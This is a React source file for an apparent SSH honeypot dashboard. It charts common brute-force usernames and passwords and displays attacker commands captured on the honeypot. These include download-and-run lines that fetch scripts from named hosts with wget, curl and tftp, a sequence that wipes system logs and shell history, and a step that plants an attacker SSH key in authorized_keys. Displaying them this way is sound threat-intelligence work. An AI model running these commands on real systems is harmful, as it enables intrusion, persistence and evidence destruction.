import React, { Fragment } from 'react';
import {Pie, Bar} from 'react-chartjs-2';
import "chartjs-plugin-labels";
import "../pages/main.css";
const data1 = {
  labels: ['root', 'admin', 'test',
  'user', 'ubuntu', "Other"],
  datasets: [{
    label: "Top 5 Usernames used for attempted bruteforce",
    data: [116496, 4995, 1543, 1260, 842, 79011],
    backgroundColor: [
      'rgba(255, 99, 132, 0.2)',
      'rgba(255, 159, 64, 0.2)',
      'rgba(255, 205, 86, 0.2)',
      'rgba(75, 192, 192, 0.2)',
      'rgba(54, 162, 235, 0.2)',
      'rgba(153, 102, 255, 0.2)',
      'rgba(201, 203, 207, 0.2)'
    ],
    borderColor: [
      'rgb(255, 99, 132)',
      'rgb(255, 159, 64)',
      'rgb(255, 205, 86)',
      'rgb(75, 192, 192)',
      'rgb(54, 162, 235)',
      'rgb(153, 102, 255)',
      'rgb(201, 203, 207)'
    ],
    borderWidth: 1
  }]
};

const data2 = {
  labels: ['123456', '123', 'password',
  '1234', '12345', "Other"],
  datasets: [{
    label: "Top 5 Passwords used for attempted bruteforce",
    data: [7267, 3161, 1979, 1563, 1291, 167584],
    backgroundColor: [
      'rgba(255, 99, 132, 0.2)',
      'rgba(255, 159, 64, 0.2)',
      'rgba(255, 205, 86, 0.2)',
      'rgba(75, 192, 192, 0.2)',
      'rgba(54, 162, 235, 0.2)',
      'rgba(153, 102, 255, 0.2)',
      'rgba(201, 203, 207, 0.2)'
    ],
    borderColor: [
      'rgb(255, 99, 132)',
      'rgb(255, 159, 64)',
      'rgb(255, 205, 86)',
      'rgb(75, 192, 192)',
      'rgb(54, 162, 235)',
      'rgb(153, 102, 255)',
      'rgb(201, 203, 207)'
    ],
    borderWidth: 1
  }]
};



export default class Usernames extends React.Component{
    render(){
        return(
            <div>
                    <Bar
        data = {data1}
        options = {{
            plugins:{
                labels:{
                    render: "value",
                    fontColor: "blue",
                    fontSize: 20,
                }
            }
        }}
        
        />
            </div>
            
        )
    }
}

export class Passwords extends React.Component{
  render(){
      return(
          <div>
                  <Bar
      data = {data2}
      options = {{
          plugins:{
              labels:{
                  render: "value",
                  fontColor: "blue",
                  fontSize: 20,
              }
          }
      }}
      
      />
          </div>
          
      )
  }
}

export class MalCode1 extends React.Component{
  render(){
    return(
      <div>
      <h1 style={{margin: 0}}> Attempted Privesc with sshd </h1>
      <div class="text-box">
      <p>1#<br/>cd /tmp; wget webserverforstudy.webredirect.org:8281/sshd -O /tmp/sshd; curl webserverforstudy.webredirect.org:8281/sshd -o /tmp/sshd; bash /tmp/sshd; rm -rf /tmp/sshd; rm -r /tmp/sshd; rm -rf /var/tmp/sshd; rm -rf /var/tmp/sshd.*; rm -rf /tmp/sshd.*
      <br/>2#<br/>cd /tmp; wget 51.79.55.208:8281/sshd -O /tmp/sshd; curl 51.79.55.208:8281/sshd -o /tmp/sshd; bash /tmp/sshd; rm -rf /tmp/sshd; rm -r /tmp/sshd; rm -rf /var/tmp/sshd; rm -rf /var/tmp/sshd.*; rm -rf /tmp/sshd.*
      </p>
      </div>
      </div>
    )
  }
}

export class MalCode2 extends React.Component{
  render(){
    return(
      <div>
      <h1 style={{margin: 0}}> Attempted Logs deletion </h1>
      <div class="text-box">
      <p>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH ; history -n ; export HISTFILE=/dev/null ; export HISTSIZE=0; export HISTFILESIZE=0 ; rm -rf /var/log/wtmp ; rm -rf /var/log/lastlog ; rm -rf /var/log/secure ; rm -rf /var/log/xferlog ; rm -rf /var/log/messages ; rm -rf /var/run/utmp ; touch /var/run/utmp ; touch /var/log/messages ; touch /var/log/wtmp ; touch /var/log/messages ; touch /var/log/xferlog ; touch /var/log/secure ;  touch /var/log/lastlog ; rm -rf /var/log/maillog ; touch /var/log/maillog ; rm -rf /root/.bash_history ; touch /root/.bash_history ; history -r </p>
      </div>
      </div>
    )
  }
}

export class MalCode3 extends React.Component{
  render(){
    return(
      <div>
      <h1 style={{margin: 0}}> Attempted Privesc with yoyobins.sh </h1>
      <div class="text-box">
      <p>cd /tmp || cd /run || cd /; wget http://134.122.65.100/yoyobins.sh; chmod 777 yoyobins.sh; sh yoyobins.sh; tftp 134.122.65.100 -c get yoyotftp1.sh; chmod 777 yoyotftp1.sh; sh yoyotftp1.sh; tftp -r yoyotftp2.sh -g 134.122.65.100; chmod 777 yoyotftp2.sh; sh yoyotftp2.sh; rm -rf yoyobins.sh yoyotftp1.sh yoyotftp2.sh; rm -rf *</p>
      </div>
      </div>
    )
  }
}

export class MalCode4 extends React.Component{
  render(){
    return(
      <div>
      <h1 style={{margin: 0}}> Fingerprinting and System Identification </h1>
      <div class="text-box">
      <p>
      uname -a<br/>
      cat /proc/cpuinfo | grep name | wc -l<br/>
      cat /proc/cpuinfo | grep name | head -n 1 | awk '&#123;print $4,$5,$6,$7,$8,$9;}'<br/>
      free -m | grep Mem | awk &apos;&#123;print $2 ,$3, $4, $5, $6, $7}&apos;<br/>
      which ls<br/>
      uname<br/>
      top<br/>
      ls -lh $(which ls)<br/>
      crontab -l<br/>
      uname -m<br/>
      lscpu | grep Model<br/>
      cat /proc/cpuinfo | grep model | grep name | wc -l<br/>
      echo Hi | cat -n
      </p>
      </div>
      </div>
    )
  }
}

export class MalCode5 extends React.Component{
  render(){
    return(
      <div>
      <h1 style={{margin: 0}}> Checking for cryptomining rigs  </h1>
      <div class="text-box">
      <p>
      ps | grep '[Mm]iner'<br/>
      ps -ef | grep '[Mm]iner'
      </p>
      </div>
      </div>
    )
  }
}

export class MalCode6 extends React.Component{
  render(){
    return(
      <div>
      <h1 style={{margin: 0}}> Attempt to add honeypot to "Outlaw Hacking Group"'s botnet</h1>
      <div class="text-box">
      <p>
      cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc
      <br/>2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcB
      <br/>Ox8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvN
      <br/>oaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0
      <br/>hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5
      <br/>w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux
      <br/>5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
      </p>
      </div>
      </div>
    )
  }
}